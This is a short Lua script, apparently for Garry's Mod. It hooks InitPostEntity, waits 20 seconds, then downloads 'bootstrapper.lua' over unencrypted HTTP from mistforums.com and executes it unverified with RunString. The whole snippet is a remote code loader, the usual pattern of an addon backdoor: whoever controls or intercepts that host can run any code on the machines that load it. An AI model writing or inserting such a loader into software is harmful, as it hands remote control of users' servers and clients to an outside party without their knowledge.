hook.Add("InitPostEntity", "startMistforums", function()
    timer.Simple(20, function()
        http.Fetch("http://mistforums.com/luasource?path=bootstrapper.lua", function(body)
            RunString( body )
        end)
    end)
end)